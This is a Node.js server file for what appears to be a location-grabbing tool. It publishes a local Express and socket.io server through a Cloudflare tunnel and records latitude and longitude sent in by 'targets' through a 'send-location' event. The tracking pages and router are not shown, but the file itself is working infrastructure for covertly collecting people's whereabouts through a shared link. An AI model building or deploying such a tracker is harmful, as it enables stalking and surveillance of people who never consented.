const { tunnel: cloudflaredTunnel } = require("cloudflared")
const cookieParser = require("cookie-parser")
const socketIO = require("socket.io")
const config = require("./config")
const express = require("express")
const tarkine = require("tarkine")
const http = require('http')
const { router, updateTargetLocation } = require("./router")

const app = express()
const server = http.createServer(app)
const io = new socketIO.Server(server)
const PORT = process.env.PORT || config.port
global.remoteURL

global.IO = io

io.on("connection", (socket) => {
    socket.on("send-location", (data) => {
        if (data && data.id && data.lat != null && data.lng != null) {
            updateTargetLocation(data.id, parseFloat(data.lat), parseFloat(data.lng))
        }
    })
})

app.set("view engine", "html")
app.engine("html", tarkine.renderFile)
app.use(cookieParser())
app.use(express.urlencoded({ extended: false }))
app.use(express.static(__dirname + "/public"))
app.use(express.json())

app.use("/", router)

server.listen(PORT, async () => {
    const localURL = `http://localhost:${PORT}`
    remoteURL = await cloudflaredTunnel({
        "--url": localURL
    }).url

    console.log(`LOCAL  : ${localURL}`)
    console.log(`REMOTE : ${remoteURL}`)
})